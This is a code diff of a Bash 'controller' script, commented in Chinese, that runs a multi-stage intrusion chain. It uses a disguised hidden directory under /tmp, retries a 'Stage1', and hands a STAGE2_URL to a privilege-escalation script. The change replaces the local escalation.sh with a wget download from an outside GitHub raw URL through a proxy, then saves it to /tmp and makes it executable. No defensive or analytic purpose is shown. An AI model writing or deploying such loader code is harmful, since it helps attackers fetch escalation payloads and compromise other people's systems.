@@ -6,9 +6,9 @@ MAX_RETRIES=5
 RETRY_DELAY=8
 TMPDIR_BASE="/tmp/.sysd-tmp"
 
-# escalation.sh 路径（默认与本脚本同目录）
-SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
-ESCALATION_SH="${SCRIPT_DIR}/escalation.sh"
+# escalation.sh 固定放在 /tmp
+ESCALATION_SH="/tmp/escalation.sh"
+ESCALATION_URL="https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/escalation.sh"
 
 touch /tmp/controller_maked_test_01122110
 
@@ -118,21 +118,16 @@ while [ $attempt -le $MAX_RETRIES ]; do
         log_success "Stage1 执行成功 (退出码: $?)"
 
         log_info "准备执行 escalation.sh，并传入参数: $STAGE2_URL"
-        if [ ! -f "$ESCALATION_SH" ]; then
-            log_error "找不到 escalation.sh: $ESCALATION_SH"
+        
+        if ! wget -q --no-cache --tries=3 --timeout=15 \
+                "$ESCALATION_URL" -O "$ESCALATION_SH"; then
+            log_error "下载 escalation.sh 失败: $ESCALATION_URL"
             exit 1
         fi
-        chmod +x "$ESCALATION_SH" 2>/dev/null || true
-        # 传入参数：stage2_url（即 STAGE2_URL）
-        if "$ESCALATION_SH" "$STAGE2_URL"; then
-            log_success "escalation.sh 执行成功"
-            log_success "控制器正常退出"
-            exit 0
-        else
-            exit_code=$?
-            log_error "escalation.sh 执行失败 (退出码: $exit_code)"
-            exit $exit_code
-        fi
+
+        chmod 755 "$ESCALATION_SH" 2>/dev/null || true
+        log_success "escalation.sh 已下载到 $ESCALATION_SH（未执行）"
+
         log_success "控制器正常退出"
         exit 0
     else
